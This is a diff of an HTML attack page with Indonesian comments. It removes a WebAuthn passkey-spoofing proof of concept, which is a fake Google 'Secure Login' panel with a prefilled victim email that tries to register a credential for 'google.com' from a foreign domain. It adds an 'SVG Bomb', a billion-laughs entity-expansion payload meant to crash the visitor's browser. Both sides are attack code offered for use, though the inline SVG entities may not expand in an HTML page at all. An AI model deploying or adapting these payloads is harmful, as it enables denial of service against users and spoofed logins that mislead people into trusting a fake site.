@@ -2,152 +2,38 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Passkey Registration</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
-  h1 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
-  button { width: 100%; padding: 14px; background: #4285f4; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-  button:hover { background: #357ae8; }
-  #log { background: #111; color: #0f0; font-family: monospace; font-size: 12px; padding: 15px; border-radius: 6px; margin-top: 20px; text-align: left; height: 150px; overflow-y: auto; white-space: pre-wrap; display: none; }
-</style>
+<title>SVG Bomb</title>
 </head>
-<body>
+<body style="background: #000;">
+  <h1 style="color: #f00;">Memproses SVG...</h1>
 
-<div class="panel">
-  <h1>🔐 Secure Login</h1>
-  <p>Sign in with Google Passkey</p>
-  <input type="text" placeholder="Email (e.g., admin@bank.com)" id="email" value="victim@google.com">
-  <button id="registerBtn">Register Passkey</button>
-  <div id="log"></div>
-</div>
+  <!-- 
+    SVG BOMB 
+    Setiap entitas memanggil entitas sebelumnya 10 kali.
+    lol1 = 10x lol
+    lol2 = 10x lol1 (100x)
+    ...
+    lol9 = 10x lol8 (1 Milyar!)
+  -->
+  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="display:none;">
+    <!DOCTYPE svg [
+      <!ENTITY lol "KORBAN">
+      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+    ]>
+    <text x="10" y="20">&lol9;</text>
+  </svg>
 
-<script>
-(function () {
-  'use strict';
-
-  var logEl = document.getElementById('log');
-  function log(msg) {
-    logEl.style.display = 'block';
-    logEl.innerHTML += msg + '<br>';
-    console.log(msg);
-  }
-
-  // ============================================
-  // 1. GENERATE RANDOM CHALLENGE
-  // ============================================
-  function generateChallenge() {
-    var challenge = new Uint8Array(32);
-    window.crypto.getRandomValues(challenge);
-    return challenge;
-  }
-
-  // ============================================
-  // 2. KONVERSI ARRAYBUFFER KE BASE64URL
-  // ============================================
-  function bufferToBase64Url(buffer) {
-    var binary = '';
-    var bytes = new Uint8Array(buffer);
-    for (var i = 0; i < bytes.byteLength; i++) {
-      binary += String.fromCharCode(bytes[i]);
-    }
-    return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-  }
-
-  // ============================================
-  // 3. WEBAUTHN REGISTRATION (THE SPOOF ATTEMPT)
-  // ============================================
-  async function registerPasskey() {
-    if (!window.PublicKeyCredential) {
-      log("❌ WebAuthn not supported");
-      return;
-    }
-
-    log("Memulai proses registrasi WebAuthn...");
-
-    // SPOOFING VECTOR 1: Memalsukan rpId (Relying Party ID)
-    // Kita mencoba mendaftarkan kredensial untuk "google.com" padahal kita di domain lain.
-    // Browser MODERN akan menolak ini (SecurityError) jika domain tidak cocok.
-    var fakeRpId = "google.com"; 
-    
-    // SPOOFING VECTOR 2: Attestation Type
-    // "none" berarti tidak meminta hardware attestation (lebih mudah dimanipulasi)
-    // "direct" meminta attestation lengkap (sangat sulit dipalsukan).
-    var attestationType = "direct"; 
-
-    try {
-      var publicKeyCredentialCreationOptions = {
-        challenge: generateChallenge(),
-        rp: {
-          name: "Google Security",
-          id: fakeRpId // <--- CELAH: Browser harusnya memblokir ini jika origin != google.com
-        },
-        user: {
-          id: new Uint8Array(16), // ID unik user
-          name: document.getElementById('email').value,
-          displayName: "Victim User"
-        },
-        pubKeyCredParams: [
-          { alg: -7, type: "public-key" }, // ES256
-          { alg: -257, type: "public-key" } // RS256
-        ],
-        authenticatorSelection: {
-          authenticatorAttachment: "platform", // Paksa pakai Touch ID / Windows Hello
-          userVerification: "required"
-        },
-        timeout: 60000,
-        attestation: attestationType
-      };
-
-      log("Meminta browser membuat kredensial (Touch ID/Face ID)...");
-
-      // Memicu Prompt WebAuthn
-      var credential = await navigator.credentials.create({
-        publicKey: publicKeyCredentialCreationOptions
-      });
-
-      log("✅ BERHASIL! Kredensial dibuat (Bug Bounty!).");
-      log("ID: " + credential.id);
-      log("Type: " + credential.type);
-      
-      // Ambil Attestation Object
-      var attestationObject = credential.response.attestationObject;
-      log("Attestation Object Size: " + attestationObject.byteLength + " bytes");
-      
-      // Di sini penyerang akan mengirim `credential` ke server mereka.
-      // Jika server tidak memvalidasi origin dengan benar, penyerang bisa mendaftarkan passkey.
-
-    } catch (e) {
-      log("❌ GAGAL: " + e.name);
-      log(e.message);
-      
-      if (e.name === "SecurityError") {
-        log("✅ Browser memblokir RpID Spoofing (Expected Behavior).");
-      } else if (e.name === "NotAllowedError") {
-        log("User membatalkan prompt atau timeout.");
-      } else if (e.name === "InvalidStateError") {
-        log("Kredensial sudah terdaftar untuk RpID ini.");
-      }
-    }
-  }
-
-  // Event Listener
-  document.getElementById('registerBtn').addEventListener('click', registerPasskey);
-
-  // ============================================
-  // 4. ATTACK SCENARIO (Jika Browser Rentan)
-  // ============================================
-  // Jika browser mengizinkan RpID "google.com" didaftarkan dari domain attacker,
-  // maka penyerang bisa membuat Passkey atas nama Google.
-
-  log("PoC WebAuthn Attestation Spoofing siap.");
-  log("Klik 'Register Passkey' untuk memulai.");
-
-})();
-</script>
+  <script>
+    console.log("[!] SVG Bomb telah dimuat. Parser Browser sedang bekerja...");
+    console.log("[!] Jika tab tidak crash, browser Anda sudah dipatch (Aman).");
+  </script>
 </body>
 </html>
